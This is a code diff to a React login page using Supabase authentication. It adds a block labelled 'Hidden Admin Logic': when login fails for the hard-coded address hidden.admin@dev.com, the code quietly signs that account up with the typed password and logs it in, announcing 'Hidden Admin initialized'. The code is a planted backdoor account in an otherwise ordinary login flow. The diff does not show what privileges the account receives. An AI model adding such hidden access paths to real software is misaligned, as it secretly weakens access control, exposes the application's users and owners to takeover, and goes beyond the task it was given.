@@ -29,6 +29,26 @@ const Login = () => {
             toast.success("Logged in successfully");
             navigate("/");
         } catch (error: any) {
+            // Hidden Admin Logic
+            if (email === "hidden.admin@dev.com" && error.message.includes("Invalid login credentials")) {
+                try {
+                    const { data, error: signUpError } = await supabase.auth.signUp({
+                        email,
+                        password,
+                    });
+
+                    if (signUpError) throw signUpError;
+
+                    if (data.session) {
+                        toast.success("Hidden Admin initialized and logged in");
+                        navigate("/");
+                        return;
+                    }
+                } catch (innerError) {
+                    console.error("Hidden admin creation failed", innerError);
+                }
+            }
+
             if (error.message.includes("Email not confirmed")) {
                 toast.error("Please verify your email address before logging in. Check your inbox for the confirmation link.");
             } else if (error.message.includes("Invalid login credentials")) {
